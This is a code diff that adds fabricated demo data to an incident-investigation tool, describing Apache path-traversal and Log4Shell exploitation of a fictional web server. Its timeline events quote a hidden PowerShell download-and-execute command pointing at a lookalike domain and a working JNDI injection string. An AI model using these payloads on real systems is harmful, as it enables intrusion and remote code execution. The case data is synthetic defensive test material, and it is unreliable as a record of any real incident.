@@ -268,6 +268,32 @@ async function main(): Promise<void> {
         lastUpdated: ts(22, 8, 0),
         status: "confirmed",
       },
+      // f009 — KEV demo: attacker exploited two unpatched CVEs on the internet-facing WEB01 server
+      // before the phishing email arrived. CVE-2021-41773 (Apache RCE) and CVE-2021-44228 (Log4Shell)
+      // are both in the CISA KEV catalog with "Known" ransomware campaign use — they will appear in
+      // the KEV synthesis context block and in report §4.5.1 when the catalog is loaded.
+      {
+        id: "f009",
+        severity: "Critical",
+        confidence: 96,
+        title: "Internet-Facing WEB01 Exploited via CVE-2021-41773 + CVE-2021-44228 (Both in CISA KEV)",
+        description:
+          "WEB01 was exploited via two unpatched CVEs before the phishing email was even opened. " +
+          "At 08:30 the attacker used CVE-2021-41773 (Apache httpd 2.4.49 path traversal / " +
+          "unauthenticated RCE via mod_cgi; CVSS 9.8) to spawn cmd.exe and download a secondary " +
+          "Cobalt Strike stager. At 08:55 CVE-2021-44228 (Log4Shell — JNDI LDAP injection in " +
+          "Log4j 2.14.1 running under Tomcat) triggered a JNDI callback to the attacker's C2 " +
+          "(185.220.101.47:1389). Both CVEs are listed in the CISA Known Exploited Vulnerabilities " +
+          "catalog with confirmed use in ransomware campaigns. WEB01 had BOTH vulnerabilities " +
+          "unpatched at the time of the incident. Required actions per CISA KEV: apply Apache " +
+          "2.4.51+ and Log4j 2.17.1+ patches immediately.",
+        relatedIocs: ["ioc001", "ioc016", "ioc017"],
+        sourceScreenshots: [],
+        mitreTechniques: ["T1190"],
+        firstSeen: ts(15, 8, 30),
+        lastUpdated: ts(22, 8, 0),
+        status: "confirmed",
+      },
     ],
 
     iocs: [
@@ -500,6 +526,21 @@ async function main(): Promise<void> {
         firstSeen: ts(17, 15, 45),
         enrichedBy: [],
       },
+      // KEV demo IOCs — CVE IDs as vulnerability indicators so extractCveIds() finds them
+      {
+        id: "ioc016",
+        type: "vulnerability",
+        value: "CVE-2021-41773",
+        firstSeen: ts(15, 8, 30),
+        enrichedBy: [],
+      },
+      {
+        id: "ioc017",
+        type: "vulnerability",
+        value: "CVE-2021-44228",
+        firstSeen: ts(15, 8, 55),
+        enrichedBy: [],
+      },
     ],
 
     mitreTechniques: [
@@ -518,6 +559,7 @@ async function main(): Promise<void> {
       { id: "T1018",     name: "Remote System Discovery",              findingIds: ["f008"] },
       { id: "T1069.002", name: "Domain Groups",                        findingIds: ["f008"] },
       { id: "T1486",     name: "Data Encrypted for Impact",            findingIds: ["f007"] },
+      { id: "T1190",     name: "Exploit Public-Facing Application",    findingIds: ["f009"] },
     ],
 
     openThreads: [
@@ -1105,6 +1147,59 @@ async function main(): Promise<void> {
         asset: "WKSTN-JSMITH",
         sources: ["THOR"],
       },
+      // CVE exploitation events (KEV demo) — attacker probed WEB01's unpatched services before
+      // using phishing as the primary vector. CVE-2021-41773 + CVE-2021-44228 are both in the
+      // CISA KEV catalog with ransomware campaign association. These appear in KEV synthesis
+      // context and in report §4.5.1 when the CISA catalog is loaded (Settings → KEV).
+      {
+        id: "e039",
+        timestamp: ts(15, 8, 30),
+        description: "Suricata IDS alert: Apache path traversal exploitation attempt (CVE-2021-41773) from 185.220.101.47 targeting WEB01:8080 — 14 requests in 60 s matching ET WEB_SERVER Apache 2.4.49 Path Traversal rule. WEB01 running Apache httpd 2.4.49 (unpatched; CVE-2021-41773 allows unauthenticated RCE via mod_cgi). Attacker began web exploitation 44 min before the phishing email arrived.",
+        severity: "High",
+        mitreTechniques: ["T1190"],
+        relatedFindingIds: ["f009"],
+        sourceScreenshots: [],
+        asset: "WEB01",
+        sources: ["Suricata"],
+        srcIp: "185.220.101.47",
+        dstIp: "10.10.20.40",
+        port: 8080,
+        action: "network_receive" as const,
+        count: 14,
+      },
+      {
+        id: "e040",
+        timestamp: ts(15, 8, 40),
+        description: "CVE-2021-41773 RCE confirmed on WEB01: Apache httpd (pid 3341) spawned cmd.exe (pid 3342) via mod_cgi path traversal (/../bin/sh) — unauthenticated remote code execution. Child process ran: powershell.exe -NoP -W Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cdn-update.microsofttech.net/init.ps1')\". Alternate initial access via web exploitation confirmed independent of the phishing email.",
+        severity: "Critical",
+        mitreTechniques: ["T1190", "T1059.001"],
+        relatedFindingIds: ["f009", "f001"],
+        sourceScreenshots: [],
+        asset: "WEB01",
+        sources: ["CrowdStrike Falcon"],
+        processName: "cmd.exe",
+        parentName: "httpd.exe",
+        chainCheck: {
+          observed: false,
+          note: "httpd.exe → cmd.exe NOT in behavioral baseline — classic CVE-2021-41773 mod_cgi shell spawn",
+          checkedAt: "2026-05-22T11:00:00.000Z",
+        },
+      },
+      {
+        id: "e041",
+        timestamp: ts(15, 8, 55),
+        description: "SIEM alert: JNDI LDAP callback from WEB01 Java process (Tomcat 9, pid 2018) to 185.220.101.47:1389 — matches Log4Shell exploitation pattern (CVE-2021-44228, CVSS 10.0). WEB01 Tomcat application uses Log4j 2.14.1 (unpatched; CVE-2021-44228 affects Log4j 2.0-beta9 through 2.14.1). JNDI lookup triggered via HTTP User-Agent header: ${jndi:ldap://185.220.101.47:1389/a}. Both CVE-2021-41773 and CVE-2021-44228 exploited on WEB01 within 25 min of each other.",
+        severity: "Critical",
+        mitreTechniques: ["T1190"],
+        relatedFindingIds: ["f009"],
+        sourceScreenshots: [],
+        asset: "WEB01",
+        sources: ["SIEM", "Suricata"],
+        srcIp: "10.10.20.40",
+        dstIp: "185.220.101.47",
+        port: 1389,
+        action: "network_send" as const,
+      },
       // Periodic Cobalt Strike beacon check-ins (T1071.001) — WKSTN-JSMITH → 185.220.101.47:443
       // roughly every 60 min with a few seconds of jitter, the classic C2 callback cadence. Each
       // check-in is low-signal on its own (Low severity); the REGULARITY across the series is the
@@ -1424,11 +1519,12 @@ async function main(): Promise<void> {
         kind: "domain",
         provider: "Shodan",
         exposedServices: [
-          { port: 25,   protocol: "SMTP", banner: "Postfix smtpd; no TLS required" },
-          { port: 8080, protocol: "HTTP", banner: "Apache/2.4.51 (CVE-2021-41773 potentially exposed)" },
-          { port: 3389, protocol: "RDP",  banner: "Terminal Services; exposed to internet" },
+          { port: 25,   protocol: "SMTP",  banner: "Postfix smtpd; no TLS required" },
+          { port: 8080, protocol: "HTTP",  banner: "Apache/2.4.49 — CVE-2021-41773 unauthenticated path traversal/RCE (mod_cgi); CVSS 9.8; unpatched" },
+          { port: 8443, protocol: "HTTPS", banner: "Apache Tomcat/9.0.53 + Log4j 2.14.1 — CVE-2021-44228 Log4Shell JNDI RCE; CVSS 10.0; unpatched" },
+          { port: 3389, protocol: "RDP",   banner: "Terminal Services; exposed to internet" },
         ],
-        summary: "3 exposed services: SMTP (no-TLS), Apache (CVE), RDP (internet-facing)",
+        summary: "4 exposed services: SMTP (no-TLS), Apache 2.4.49 (CVE-2021-41773 RCE unpatched), Tomcat (CVE-2021-44228 Log4Shell unpatched), RDP (internet-facing)",
       },
     ],
   });
@@ -1501,9 +1597,9 @@ async function main(): Promise<void> {
   // ── done ───────────────────────────────────────────────────────────────────
   console.log(`\nDemo case "${CASE_ID}" created successfully.`);
   console.log(`  Path: ${CASE_DIR}`);
-  console.log(`  Findings:       ${investigation.findings.length}  (2 Critical, 2 High, 2 Medium, 1 Low, 1 Info)`);
-  console.log(`  IOCs:           ${investigation.iocs.length}  (IPs, domains, hashes, files, processes, URLs)`);
-  console.log(`  Forensic events:${investigation.forensicTimeline.length} (Critical→Info, evidence chain, process chain)`);
+  console.log(`  Findings:       ${investigation.findings.length}  (3 Critical, 2 High, 2 Medium, 1 Low, 1 Info)`);
+  console.log(`  IOCs:           ${investigation.iocs.length}  (IPs, domains, hashes, files, processes, URLs, CVE vulnerabilities)`);
+  console.log(`  Forensic events:${investigation.forensicTimeline.length} (Critical→Info, evidence chain, CVE exploitation events)`);
   console.log(`  MITRE:          ${investigation.mitreTechniques.length} techniques`);
   console.log(`  Threads:        ${investigation.openThreads.length}  (2 open, 1 closed)`);
   console.log(`  Key questions:  ${investigation.keyQuestions.length}  (answered/partial/unknown)`);
